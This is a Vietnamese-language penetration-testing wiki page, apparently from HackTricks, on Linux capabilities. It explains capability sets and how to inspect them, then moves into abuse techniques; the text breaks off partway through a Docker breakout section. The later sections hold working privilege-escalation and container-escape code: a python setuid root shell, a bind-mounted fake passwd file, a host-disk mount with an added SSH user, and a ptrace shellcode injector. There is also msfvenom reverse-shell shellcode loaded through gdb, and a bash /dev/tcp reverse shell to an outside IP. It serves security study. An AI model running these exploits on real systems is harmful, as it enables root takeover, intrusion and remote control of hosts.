# Linux Capabilities

{{#include ../../banners/hacktricks-training.md}}

Linux capabilities chia **quyền root thành các đơn vị nhỏ, riêng biệt**, cho phép tiến trình chỉ có một tập con quyền. Điều này giảm thiểu rủi ro bằng cách không cấp toàn bộ quyền root khi không cần thiết.<sup>[[3]](#references)[[4]](#references)[[5]](#references)[[14]](#references)</sup>

### Vấn đề:

- Người dùng thông thường có quyền hạn chế đối với các thao tác như mở raw socket hoặc bind các cổng Internet dưới 1024; capabilities có thể chỉ cấp quyền thực hiện thao tác cần thiết thay vì toàn bộ quyền root.<sup>[[14]](#references)</sup>

### Các tập capability:

Linux cung cấp các tập capability này cho mỗi thread, và kernel áp dụng các giới hạn của chúng khi một tiến trình thay đổi credentials hoặc thực thi một file.<sup>[[14]](#references)</sup>

1. **Inherited (CapInh)**:

   - **Mục đích**: Xác định các capability có thể được đưa vào tập permitted sau `execve()` khi file được thực thi có các file capability inheritable tương ứng.
   - **Chức năng**: Tập inheritable của thread được giữ nguyên qua `execve()`; bản thân nó không làm cho các capability đó trở thành effective.
   - **Giới hạn**: Việc thêm một capability vào tập này bị giới hạn bởi các tập permitted và bounding.<sup>[[14]](#references)</sup>

2. **Effective (CapEff)**:

   - **Mục đích**: Đại diện cho các capability mà tiến trình đang sử dụng tại một thời điểm bất kỳ.
   - **Chức năng**: Đây là tập capability mà kernel kiểm tra để cấp quyền thực hiện các thao tác khác nhau. Đối với file, tập này có thể là một cờ cho biết các capability permitted của file có được xem là effective hay không.
   - **Ý nghĩa**: Tập effective rất quan trọng đối với việc kiểm tra quyền tức thời, đóng vai trò là tập capability đang hoạt động mà tiến trình có thể sử dụng.

3. **Permitted (CapPrm)**:

   - **Mục đích**: Xác định tập capability tối đa mà một tiến trình có thể sở hữu.
   - **Chức năng**: Tiến trình có thể nâng một capability từ tập permitted lên tập effective, qua đó có thể sử dụng capability đó. Tiến trình cũng có thể loại bỏ capability khỏi tập permitted.
   - **Giới hạn**: Nếu một capability bị loại bỏ khỏi tập này, thông thường không thể khôi phục nó nếu không thực thi một file cấp capability đó hoặc trải qua một chuyển đổi đặc quyền khác.<sup>[[14]](#references)</sup>

4. **Bounding (CapBnd)**:

   - **Mục đích**: Giới hạn các capability mà tiến trình có thể nhận được từ một file trong quá trình `execve()` và các capability mà tiến trình có thể thêm vào tập inheritable.
   - **Chức năng**: Tập này được kế thừa qua `fork()` và giữ nguyên qua `execve()`; có thể loại bỏ capability khỏi tập này nếu caller có `CAP_SETPCAP`.
   - **Trường hợp sử dụng**: Loại bỏ các capability không cần thiết khỏi tập này sẽ hạn chế khả năng đạt được thêm đặc quyền về sau.<sup>[[14]](#references)</sup>

5. **Ambient (CapAmb)**:
   - **Mục đích**: Cho phép các capability được chọn tiếp tục ở trạng thái permitted và effective qua `execve()` của một chương trình không có đặc quyền.
   - **Chức năng**: Các ambient capability được thêm vào các tập permitted và effective mới khi file được thực thi không có đặc quyền.
   - **Giới hạn**: Một capability chỉ có thể là ambient khi nó hiện diện trong cả hai tập permitted và inheritable; việc thực thi file set-user-ID/set-group-ID hoặc file có capabilities sẽ xóa tập ambient.<sup>[[8]](#references)[[9]](#references)[[14]](#references)</sup>

## Capabilities của tiến trình & binary

### Capabilities của tiến trình

Để xem capabilities của một tiến trình cụ thể, hãy dùng file **status** trong thư mục /proc. Vì file này cung cấp nhiều thông tin chi tiết hơn, hãy chỉ lọc những thông tin liên quan đến Linux capabilities.\
Lưu ý rằng thông tin capability của mọi tiến trình đang chạy được duy trì theo từng thread, trong khi file capabilities được lưu trong các extended attribute `security.capability`.<sup>[[14]](#references)[[15]](#references)</sup>

Bạn có thể tìm thấy danh sách capabilities được định nghĩa trong /usr/include/linux/capability.h

Bạn có thể xem capabilities của tiến trình hiện tại bằng `cat /proc/self/status` hoặc `capsh --print`, và xem capabilities của các tiến trình khác trong `/proc/<pid>/status`.<sup>[[15]](#references)[[26]](#references)</sup>

```bash
cat /proc/1234/status | grep Cap
cat /proc/$$/status | grep Cap #This will print the capabilities of the current process
```

Lệnh này sẽ trả về năm dòng capability trên hầu hết các hệ thống.<sup>[[15]](#references)</sup>

- CapInh = Các capability được kế thừa
- CapPrm = Các capability được cho phép
- CapEff = Các capability có hiệu lực
- CapBnd = Tập giới hạn
- CapAmb = Tập capability ambient

```bash
#These are the typical capabilities of a root owned process (all)
CapInh: 0000000000000000
CapPrm: 0000003fffffffff
CapEff: 0000003fffffffff
CapBnd: 0000003fffffffff
CapAmb: 0000000000000000
```

Các số thập lục phân này không có ý nghĩa gì rõ ràng. Dùng tiện ích `capsh`, chúng ta có thể giải mã chúng thành tên capability.<sup>[[26]](#references)</sup>

```bash
capsh --decode=0000003fffffffff
0x0000003fffffffff=cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,37
```

Giờ hãy kiểm tra **capabilities** được `ping` sử dụng:

```bash
cat /proc/9491/status | grep Cap
CapInh:    0000000000000000
CapPrm:    0000000000003000
CapEff:    0000000000000000
CapBnd:    0000003fffffffff
CapAmb:    0000000000000000

capsh --decode=0000000000003000
0x0000000000003000=cap_net_admin,cap_net_raw
```

Mặc dù cách đó hoạt động, vẫn còn một cách khác dễ hơn. Để xem capabilities của một tiến trình đang chạy, hãy dùng công cụ **getpcaps** theo sau là ID tiến trình (PID); công cụ này cũng chấp nhận danh sách ID tiến trình.<sup>[[22]](#references)</sup>

```bash
getpcaps 1234
```

Hãy kiểm tra các capabilities của `tcpdump` sau khi cấp cho binary này `cap_net_admin` và `cap_net_raw` để sniff mạng (`tcpdump` đang chạy trong process 9562).<sup>[[22]](#references)[[25]](#references)</sup>

```bash
#The following command give tcpdump the needed capabilities to sniff traffic
$ setcap cap_net_raw,cap_net_admin=eip /usr/sbin/tcpdump

$ getpcaps 9562
Capabilities for `9562': = cap_net_admin,cap_net_raw+ep

$ cat /proc/9562/status | grep Cap
CapInh:    0000000000000000
CapPrm:    0000000000003000
CapEff:    0000000000003000
CapBnd:    0000003fffffffff
CapAmb:    0000000000000000

$ capsh --decode=0000000000003000
0x0000000000003000=cap_net_admin,cap_net_raw
```

Như bạn có thể thấy, các capability tương ứng với kết quả thu được từ hai cách kiểm tra một process. Công cụ `getpcaps` sử dụng libcap để truy vấn các capability của process đích và in chúng dưới dạng văn bản; công cụ này chấp nhận một hoặc nhiều PID.<sup>[[22]](#references)</sup>

### Capability của binary

Binary có thể có file capability được áp dụng khi thực thi. Ví dụ, một binary `ping` có thể mang capability `cap_net_raw`.<sup>[[14]](#references)</sup>

```bash
getcap /usr/bin/ping
/usr/bin/ping = cap_net_raw+ep
```

Bạn có thể **tìm kiếm các tệp nhị phân có capabilities** bằng `getcap -r`.<sup>[[23]](#references)</sup>

```bash
getcap -r / 2>/dev/null
```

### Loại bỏ capabilities bằng capsh

Nếu loại bỏ `CAP_NET_RAW` khỏi bounding set hiện hành, chương trình cần capability đó sẽ không còn sử dụng được nó.<sup>[[26]](#references)</sup>

```bash
capsh --drop=cap_net_raw --print -- -c "tcpdump"
```

Ngoài đầu ra của chính _capsh_, lệnh _tcpdump_ cũng sẽ báo lỗi.

> /bin/bash: /usr/sbin/tcpdump: Operation not permitted

Lỗi này cho thấy `tcpdump` không thể thực thi với file capability được yêu cầu sau khi `CAP_NET_RAW` bị xóa khỏi bounding set.

### Xóa Capabilities

Bạn có thể xóa capabilities của một file bằng `setcap -r`.<sup>[[25]](#references)</sup>

```bash
setcap -r </path/to/binary>
```

## Capabilities của người dùng

Linux không gán file capabilities trực tiếp cho người dùng đăng nhập, nhưng module PAM `pam_cap` có thể thiết lập inheritable capabilities cho các phiên đã xác thực thông qua `/etc/security/capability.conf`.<sup>[[16]](#references)</sup> Mỗi mục ánh xạ các tên hoặc số capability, phân tách bằng dấu phẩy, tới một hoặc nhiều tên người dùng.<sup>[[17]](#references)</sup>
Ví dụ tệp:

```bash
# Simple
cap_sys_ptrace               developer
cap_net_raw                  user1

# Multiple capablities
cap_net_admin,cap_net_raw    jrnetadmin
# Identical, but with numeric values
12,13                        jrnetadmin

# Combining names and numerics
cap_sys_admin,22,25          jrsysadmin
```

## Capabilities của môi trường

Biên dịch chương trình sau sẽ cho phép **khởi chạy shell bash bên trong một môi trường cung cấp capabilities**.<sup>[[14]](#references)</sup>

```c:ambient.c
/*
 * Test program for the ambient capabilities
 *
 * compile using:
 * gcc -Wl,--no-as-needed -lcap-ng -o ambient ambient.c
 * Set effective, inherited and permitted capabilities to the compiled binary
 * sudo setcap cap_setpcap,cap_net_raw,cap_net_admin,cap_sys_nice+eip ambient
 *
 * To get a shell with additional caps that can be inherited do:
 *
 * ./ambient /bin/bash
 */

#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <errno.h>
#include <sys/prctl.h>
#include <linux/capability.h>
#include <cap-ng.h>

static void set_ambient_cap(int cap) {
  int rc;
  capng_get_caps_process();
  rc = capng_update(CAPNG_ADD, CAPNG_INHERITABLE, cap);
  if (rc) {
    printf("Cannot add inheritable cap\n");
    exit(2);
  }
  capng_apply(CAPNG_SELECT_CAPS);
  /* Note the two 0s at the end. Kernel checks for these */
  if (prctl(PR_CAP_AMBIENT, PR_CAP_AMBIENT_RAISE, cap, 0, 0)) {
    perror("Cannot set cap");
    exit(1);
  }
}
void usage(const char * me) {
  printf("Usage: %s [-c caps] new-program new-args\n", me);
  exit(1);
}
int default_caplist[] = {
  CAP_NET_RAW,
  CAP_NET_ADMIN,
  CAP_SYS_NICE,
  -1
};
int * get_caplist(const char * arg) {
  int i = 1;
  int * list = NULL;
  char * dup = strdup(arg), * tok;
  for (tok = strtok(dup, ","); tok; tok = strtok(NULL, ",")) {
    list = realloc(list, (i + 1) * sizeof(int));
    if (!list) {
      perror("out of memory");
      exit(1);
    }
    list[i - 1] = atoi(tok);
    list[i] = -1;
    i++;
  }
  return list;
}
int main(int argc, char ** argv) {
  int rc, i, gotcaps = 0;
  int * caplist = NULL;
  int index = 1; // argv index for cmd to start
  if (argc < 2)
    usage(argv[0]);
  if (strcmp(argv[1], "-c") == 0) {
    if (argc <= 3) {
      usage(argv[0]);
    }
    caplist = get_caplist(argv[2]);
    index = 3;
  }
  if (!caplist) {
    caplist = (int * ) default_caplist;
  }
  for (i = 0; caplist[i] != -1; i++) {
    printf("adding %d to ambient list\n", caplist[i]);
    set_ambient_cap(caplist[i]);
  }
  printf("Ambient forking shell\n");
  if (execv(argv[index], argv + index))
    perror("Cannot exec");
  return 0;
}
```

```bash
gcc -Wl,--no-as-needed -lcap-ng -o ambient ambient.c
sudo setcap cap_setpcap,cap_net_raw,cap_net_admin,cap_sys_nice+eip ambient
./ambient /bin/bash
```

Bên trong **bash được thực thi bởi binary ambient đã biên dịch**, có thể quan sát các **capability mới** (người dùng thông thường sẽ không có capability nào trong phần "current").<sup>[[14]](#references)</sup>

```bash
capsh --print
Current: = cap_net_admin,cap_net_raw,cap_sys_nice+eip
```

> [!CAUTION]
> Bạn **chỉ có thể thêm các capabilities có mặt** trong cả tập permitted lẫn tập inheritable.<sup>[[14]](#references)</sup>

### Binary-aware/Binary-dumb về capabilities

Binary capability-dumb là một chương trình có file capabilities nhưng không dùng libcap để quản lý chúng. Nếu bit effective của file được bật, kernel sẽ bật các capabilities trong tập permitted của file vào tập effective của process; quá trình thực thi có thể thất bại nếu process không nhận được tất cả các capabilities permitted.<sup>[[14]](#references)</sup>

## Capabilities của service

Một system service chạy với quyền root có thể giữ lại các capabilities rộng, trừ khi môi trường thực thi giới hạn chúng. Trong một systemd unit, `User=` chọn user của service và `AmbientCapabilities=` thêm các capabilities được chỉ định vào tập ambient của process được thực thi.<sup>[[18]](#references)</sup>

```bash
[Service]
User=bob
AmbientCapabilities=CAP_NET_BIND_SERVICE
```

## Capabilities trong Docker Containers

Docker khởi chạy các container với một tập capability mặc định có thể thay đổi bằng `--cap-add` và `--cap-drop`; có thể kiểm tra một container mẫu bằng `amicontained`.<sup>[[19]](#references)[[24]](#references)</sup>

```bash
docker run --rm -it  r.j3ss.co/amicontained bash
Capabilities:
	BOUNDING -> chown dac_override fowner fsetid kill setgid setuid setpcap net_bind_service net_raw sys_chroot mknod audit_write setfcap

# Add a capabilities
docker run --rm -it --cap-add=SYS_ADMIN r.j3ss.co/amicontained bash

# Add all capabilities
docker run --rm -it --cap-add=ALL r.j3ss.co/amicontained bash

# Remove all and add only one
docker run --rm -it  --cap-drop=ALL --cap-add=SYS_PTRACE r.j3ss.co/amicontained bash
```

## Privesc/Container Escape

Capabilities hữu ích khi bạn **muốn hạn chế các tiến trình của mình sau khi thực hiện các thao tác đặc quyền** (ví dụ: sau khi thiết lập chroot và bind vào một socket). Tuy nhiên, chúng có thể bị khai thác bằng cách truyền cho chúng các lệnh hoặc đối số độc hại, khiến các lệnh hoặc đối số đó được chạy với quyền root.<sup>[[2]](#references)</sup>

Bạn có thể ép các file capabilities lên chương trình bằng `setcap` và truy vấn chúng bằng `getcap`.<sup>[[23]](#references)[[25]](#references)</sup>

```bash
#Set Capability
setcap cap_net_raw+ep /sbin/ping

#Get Capability
getcap /sbin/ping
/sbin/ping = cap_net_raw+ep
```

Đối với văn bản file-capability, `+ep` thêm capability được chỉ định vào các tập effective và permitted; `-` hạ các cờ đã chọn.<sup>[[21]](#references)</sup>

Để xác định các chương trình có capabilities trong hệ thống hoặc thư mục, hãy dùng `getcap -r`.<sup>[[23]](#references)</sup>

```bash
getcap -r / 2>/dev/null
```

### Ví dụ khai thác

Trong ví dụ sau, binary `/usr/bin/python2.6` được phát hiện có lỗ hổng privesc:

```bash
setcap cap_setuid+ep /usr/bin/python2.7
/usr/bin/python2.7 = cap_setuid+ep

#Exploit
/usr/bin/python2.7 -c 'import os; os.setuid(0); os.system("/bin/bash");'
```

**Capabilities** cần thiết cho `tcpdump` để **cho phép bất kỳ người dùng nào sniff packets**:

```bash
setcap cap_net_raw,cap_net_admin=eip /usr/sbin/tcpdump
getcap /usr/sbin/tcpdump
/usr/sbin/tcpdump = cap_net_admin,cap_net_raw+eip
```

### Trường hợp đặc biệt khi tên capability bị bỏ trống

Trong định dạng văn bản của libcap, `getcap myelf` báo `myelf =ep` có nghĩa là **tất cả capability** được đánh dấu là effective và permitted, tùy thuộc vào bounding set, user namespace và các hạn chế thực thi khác của tiến trình đang chạy. Tập file capability rỗng được biểu thị là `myelf =` (không có `e` hoặc `p`); trường hợp này khác với file không có thuộc tính capability. File `=ep` tự nó không thay đổi UID của tiến trình thành root, nhưng chương trình có thể sử dụng `CAP_DAC_READ_SEARCH` hoặc `CAP_DAC_OVERRIDE` có thể đọc các file mà UID Unix của nó vốn không có quyền đọc. Hãy xác nhận file mode, namespace và effective capabilities của executable thực tế trước khi xem các tùy chọn đầu vào của nó là đường dẫn đọc file có đặc quyền. Xem [định dạng văn bản capability](https://man7.org/linux/man-pages/man7/cap_text_formats.7.html) và [hành vi của giá trị rỗng](https://man7.org/linux/man-pages/man8/getcap.8.html) trong libcap.<sup>[[14]](#references)</sup>

## CAP_SYS_ADMIN

**[`CAP_SYS_ADMIN`](https://man7.org/linux/man-pages/man7/capabilities.7.html)** là một Linux capability có quyền hạn rất lớn, thường được xem là gần tương đương mức root do có các **quyền quản trị** rộng, chẳng hạn như mount thiết bị hoặc thao tác với các tính năng của kernel. Dù không thể thiếu đối với các container mô phỏng toàn bộ hệ thống, **`CAP_SYS_ADMIN` đặt ra những thách thức đáng kể về bảo mật**, đặc biệt trong môi trường container, do khả năng leo thang đặc quyền và xâm phạm hệ thống. Vì vậy, việc sử dụng capability này cần được đánh giá bảo mật nghiêm ngặt và quản lý thận trọng; nên ưu tiên loại bỏ capability này khỏi các container dành riêng cho ứng dụng để tuân thủ **nguyên tắc đặc quyền tối thiểu** và giảm thiểu bề mặt tấn công.<sup>[[14]](#references)</sup>

Với các thao tác chuyển namespace, phạm vi rất quan trọng: `setns()` kiểm tra `CAP_SYS_ADMIN` dựa trên user namespace sở hữu namespace đích. Việc vào một mount namespace cũng yêu cầu caller có `CAP_SYS_CHROOT` trong user namespace của mình. Do đó, capability chỉ có trong một user namespace remap riêng không cấp quyền vào tùy ý các namespace của host ban đầu.<sup>[[14]](#references)</sup>

**Ví dụ với binary**

```bash
getcap -r / 2>/dev/null
/usr/bin/python2.7 = cap_sys_admin+ep
```

Dùng Python, bạn có thể mount một tệp _passwd_ đã chỉnh sửa đè lên tệp _passwd_ thực:

```bash
cp /etc/passwd ./ #Create a copy of the passwd file
openssl passwd -1 -salt abc password #Get hash of "password"
vim ./passwd #Change roots passwords of the fake passwd file
```

Và cuối cùng, **mount** tệp `passwd` đã chỉnh sửa lên `/etc/passwd`:

```python
from ctypes import *
libc = CDLL("libc.so.6")
libc.mount.argtypes = (c_char_p, c_char_p, c_char_p, c_ulong, c_char_p)
MS_BIND = 4096
source = b"/path/to/fake/passwd"
target = b"/etc/passwd"
filesystemtype = b"none"
options = b"rw"
mountflags = MS_BIND
libc.mount(source, target, filesystemtype, mountflags, options)
```

Và bạn sẽ có thể **`su` thành root** bằng mật khẩu "password".

**Ví dụ với môi trường (Docker breakout)**

Bạn có thể kiểm tra các capabilities được bật bên trong docker container bằng cách dùng:

```
capsh --print
Current: = cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read+ep
Bounding set =cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read
Securebits: 00/0x0/1'b0
 secure-noroot: no (unlocked)
 secure-no-suid-fixup: no (unlocked)
 secure-keep-caps: no (unlocked)
uid=0(root)
gid=0(root)
groups=0(root)
```

Trong kết quả trước đó, bạn có thể thấy capability SYS_ADMIN được bật.<sup>[[14]](#references)</sup>

- **Mount**

Với quyền truy cập phù hợp vào device và namespace, việc này có thể cho phép một Docker container **mount ổ đĩa của host và truy cập nội dung bên trong**. Device node phải đại diện cho một thiết bị thực của host, device cgroup phải cho phép truy cập thiết bị đó, và để mount filesystem dựa trên block, cần có `CAP_SYS_ADMIN` trong initial user namespace.<sup>[[14]](#references)</sup>

```bash
lsblk -o NAME,PATH,TYPE,SIZE,FSTYPE,MOUNTPOINTS
node_root_device=/dev/sda1 # Replace with the validated filesystem partition or LV.
mkdir -p /mnt/host
mount -o ro "${node_root_device}" /mnt/host
cat /mnt/host/etc/hostname
umount /mnt/host
```

- **Toàn quyền truy cập**

Trong phương pháp trước, chúng ta đã truy cập được vào ổ đĩa của host.\
Nếu host đang chạy server **ssh**, bạn có thể **tạo một user bên trong ổ đĩa đã mount** rồi truy cập qua SSH.<sup>[[14]](#references)</sup>

```bash
#Like in the example before, the first step is to mount the docker host disk
node_root_device=/dev/sda1
mount "${node_root_device}" /mnt/host

#Then, search for open ports inside the docker host
nc -v -n -w2 -z 172.17.0.1 1-65535
(UNKNOWN) [172.17.0.1] 2222 (?) open

#Finally, create a new user inside the docker host and use it to access via SSH
chroot /mnt/host adduser john
ssh john@172.17.0.1 -p 2222
```

Các thao tác đọc và ghi trực tiếp bên dưới `/mnt/host` đã là quyền truy cập hệ thống tệp của host. `chroot` cuối cùng chỉ giúp thuận tiện khi dùng đường dẫn và còn yêu cầu `CAP_SYS_CHROOT`; đây không phải là bước tạo ra khả năng thoát.

## CAP_SYS_PTRACE

Với `CAP_SYS_PTRACE`, một tiến trình có thể trace và kiểm tra các tiến trình khác mà nó nhìn thấy trong PID namespace của mình. Để nhắm tới các tiến trình trên host từ một Docker container, hãy chia sẻ PID namespace của host bằng `--pid=host` (hoặc tham gia một namespace có chứa tiến trình mục tiêu).<sup>[[14]](#references)[[20]](#references)</sup>

**[`CAP_SYS_PTRACE`](https://man7.org/linux/man-pages/man7/capabilities.7.html)** cấp quyền sử dụng các chức năng debugging và system call tracing do `ptrace(2)` cung cấp, cũng như các lệnh gọi gắn kết bộ nhớ chéo như `process_vm_readv(2)` và `process_vm_writev(2)`. Dù hữu ích cho mục đích chẩn đoán và giám sát, nếu bật `CAP_SYS_PTRACE` mà không có các biện pháp hạn chế như seccomp filter đối với `ptrace(2)`, nó có thể làm suy yếu đáng kể tính bảo mật của hệ thống. Cụ thể, quyền này có thể bị khai thác để vượt qua các hạn chế bảo mật khác, đáng chú ý là các hạn chế do seccomp áp đặt, như được minh họa trong [các proof of concept (PoC) như ví dụ này](https://gist.github.com/thejh/8346f47e359adecd1d53).<sup>[[10]](#references)</sup>

**Ví dụ với binary (python)**

```bash
getcap -r / 2>/dev/null
/usr/bin/python2.7 = cap_sys_ptrace+ep
```

```python
import ctypes
import sys
import struct
# Macros defined in <sys/ptrace.h>
# https://code.woboq.org/qt5/include/sys/ptrace.h.html
PTRACE_POKETEXT = 4
PTRACE_GETREGS = 12
PTRACE_SETREGS = 13
PTRACE_ATTACH = 16
PTRACE_DETACH = 17
# Structure defined in <sys/user.h>
# https://code.woboq.org/qt5/include/sys/user.h.html#user_regs_struct
class user_regs_struct(ctypes.Structure):
    _fields_ = [
        ("r15", ctypes.c_ulonglong),
        ("r14", ctypes.c_ulonglong),
        ("r13", ctypes.c_ulonglong),
        ("r12", ctypes.c_ulonglong),
        ("rbp", ctypes.c_ulonglong),
        ("rbx", ctypes.c_ulonglong),
        ("r11", ctypes.c_ulonglong),
        ("r10", ctypes.c_ulonglong),
        ("r9", ctypes.c_ulonglong),
        ("r8", ctypes.c_ulonglong),
        ("rax", ctypes.c_ulonglong),
        ("rcx", ctypes.c_ulonglong),
        ("rdx", ctypes.c_ulonglong),
        ("rsi", ctypes.c_ulonglong),
        ("rdi", ctypes.c_ulonglong),
        ("orig_rax", ctypes.c_ulonglong),
        ("rip", ctypes.c_ulonglong),
        ("cs", ctypes.c_ulonglong),
        ("eflags", ctypes.c_ulonglong),
        ("rsp", ctypes.c_ulonglong),
        ("ss", ctypes.c_ulonglong),
        ("fs_base", ctypes.c_ulonglong),
        ("gs_base", ctypes.c_ulonglong),
        ("ds", ctypes.c_ulonglong),
        ("es", ctypes.c_ulonglong),
        ("fs", ctypes.c_ulonglong),
        ("gs", ctypes.c_ulonglong),
    ]

libc = ctypes.CDLL("libc.so.6")

pid=int(sys.argv[1])

# Define argument type and respone type.
libc.ptrace.argtypes = [ctypes.c_uint64, ctypes.c_uint64, ctypes.c_void_p, ctypes.c_void_p]
libc.ptrace.restype = ctypes.c_uint64

# Attach to the process
libc.ptrace(PTRACE_ATTACH, pid, None, None)
registers=user_regs_struct()

# Retrieve the value stored in registers
libc.ptrace(PTRACE_GETREGS, pid, None, ctypes.byref(registers))
print("Instruction Pointer: " + hex(registers.rip))
print("Injecting Shellcode at: " + hex(registers.rip))

# Shell code copied from exploit db. https://github.com/0x00pf/0x00sec_code/blob/master/mem_inject/infect.c
shellcode = "\x48\x31\xc0\x48\x31\xd2\x48\x31\xf6\xff\xc6\x6a\x29\x58\x6a\x02\x5f\x0f\x05\x48\x97\x6a\x02\x66\xc7\x44\x24\x02\x15\xe0\x54\x5e\x52\x6a\x31\x58\x6a\x10\x5a\x0f\x05\x5e\x6a\x32\x58\x0f\x05\x6a\x2b\x58\x0f\x05\x48\x97\x6a\x03\x5e\xff\xce\xb0\x21\x0f\x05\x75\xf8\xf7\xe6\x52\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x48\x8d\x3c\x24\xb0\x3b\x0f\x05"

# Inject the shellcode into the running process byte by byte.
for i in xrange(0,len(shellcode),4):
    # Convert the byte to little endian.
    shellcode_byte_int=int(shellcode[i:4+i].encode('hex'),16)
    shellcode_byte_little_endian=struct.pack("<I", shellcode_byte_int).rstrip('\x00').encode('hex')
    shellcode_byte=int(shellcode_byte_little_endian,16)

    # Inject the byte.
    libc.ptrace(PTRACE_POKETEXT, pid, ctypes.c_void_p(registers.rip+i),shellcode_byte)

print("Shellcode Injected!!")

# Modify the instuction pointer
registers.rip=registers.rip+2

# Set the registers
libc.ptrace(PTRACE_SETREGS, pid, None, ctypes.byref(registers))
print("Final Instruction Pointer: " + hex(registers.rip))

# Detach from the process.
libc.ptrace(PTRACE_DETACH, pid, None, None)
```

**Ví dụ với binary (gdb)**

`gdb` có capability `ptrace`:

```
/usr/bin/gdb = cap_sys_ptrace+ep
```

Một capability trên debugger chỉ là đầu mối để rà soát. Kiểm tra xem tiến trình hiện tại có thể thực thi chính xác tệp đó hay không (bao gồm quyền của group và ACL), liệu `CAP_SYS_PTRACE` có hiệu lực sau khi thực thi hay không, và liệu tiến trình đích có đặc quyền cao hơn có hiển thị và có thể được attach trong cùng PID namespace hay không. `no_new_privs`, một mount `nosuid`, capability bounding set, Yama, seccomp hoặc một LSM có thể làm thay đổi kết quả. Xem [`capabilities(7)`](https://man7.org/linux/man-pages/man7/capabilities.7.html) và [tài liệu Yama của kernel](https://docs.kernel.org/admin-guide/LSM/Yama.html). Liệt kê metadata của tệp và tiến trình mà không attach vào tiến trình đích.

Tạo shellcode bằng msfvenom để inject vào bộ nhớ thông qua gdb.

```python
# msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.11 LPORT=9001 -f py -o revshell.py
buf =  b""
buf += b"\x6a\x29\x58\x99\x6a\x02\x5f\x6a\x01\x5e\x0f\x05"
buf += b"\x48\x97\x48\xb9\x02\x00\x23\x29\x0a\x0a\x0e\x0b"
buf += b"\x51\x48\x89\xe6\x6a\x10\x5a\x6a\x2a\x58\x0f\x05"
buf += b"\x6a\x03\x5e\x48\xff\xce\x6a\x21\x58\x0f\x05\x75"
buf += b"\xf6\x6a\x3b\x58\x99\x48\xbb\x2f\x62\x69\x6e\x2f"
buf += b"\x73\x68\x00\x53\x48\x89\xe7\x52\x57\x48\x89\xe6"
buf += b"\x0f\x05"

# Divisible by 8
payload = b"\x90" * (-len(buf) % 8) + buf

# Change endianess and print gdb lines to load the shellcode in RIP directly
for i in range(0, len(buf), 8):
	chunk = payload[i:i+8][::-1]
	chunks = "0x"
	for byte in chunk:
		chunks += f"{byte:02x}"

	print(f"set {{long}}($rip+{i}) = {chunks}")
```

Debug tiến trình root bằng gdb và sao chép-dán các dòng gdb đã tạo trước đó:

```bash
# Let's write the commands to a file
echo 'set {long}($rip+0) = 0x296a909090909090
set {long}($rip+8) = 0x5e016a5f026a9958
set {long}($rip+16) = 0x0002b9489748050f
set {long}($rip+24) = 0x48510b0e0a0a2923
set {long}($rip+32) = 0x582a6a5a106ae689
set {long}($rip+40) = 0xceff485e036a050f
set {long}($rip+48) = 0x6af675050f58216a
set {long}($rip+56) = 0x69622fbb4899583b
set {long}($rip+64) = 0x8948530068732f6e
set {long}($rip+72) = 0x050fe689485752e7
c' > commands.gdb
# In this case there was a sleep run by root
## NOTE that the process you abuse will die after the shellcode
/usr/bin/gdb -p $(pgrep sleep)
[...]
(gdb) source commands.gdb
Continuing.
process 207009 is executing new program: /usr/bin/dash
[...]
```

**Ví dụ với environment (Docker breakout) - Một cách Abuse GDB khác**

Nếu đã cài **GDB** (hoặc bạn có thể cài bằng `apk add gdb` hoặc `apt install gdb`, chẳng hạn), bạn có thể **debug một tiến trình host có thể nhìn thấy** và khiến tiến trình đó gọi hàm `system`. Việc này cần `CAP_SYS_PTRACE` hiệu lực trong user namespace của target và khả năng nhìn thấy PID của host; không cần `CAP_SYS_ADMIN`. Yama, trạng thái non-dumpable, seccomp và chính sách LSM vẫn có thể chặn thao tác attach.

```bash
gdb -p 1234
(gdb) call (void)system("ls")
(gdb) call (void)system("sleep 5")
(gdb) call (void)system("bash -c 'bash -i >& /dev/tcp/192.168.115.135/5656 0>&1'")
```

Bạn sẽ không thể xem đầu ra của lệnh được thực thi, nhưng lệnh sẽ được tiến trình đó thực thi (vì vậy hãy lấy một rev shell).

> [!WARNING]
> Nếu gặp lỗi "No symbol "system" in current context.", hãy xem ví dụ trước đó về cách tải shellcode vào một chương trình thông qua gdb.

**Ví dụ với environment (Docker breakout) - Shellcode Injection**

Bạn có thể kiểm tra các capabilities được bật bên trong docker container bằng lệnh:

```bash
capsh --print
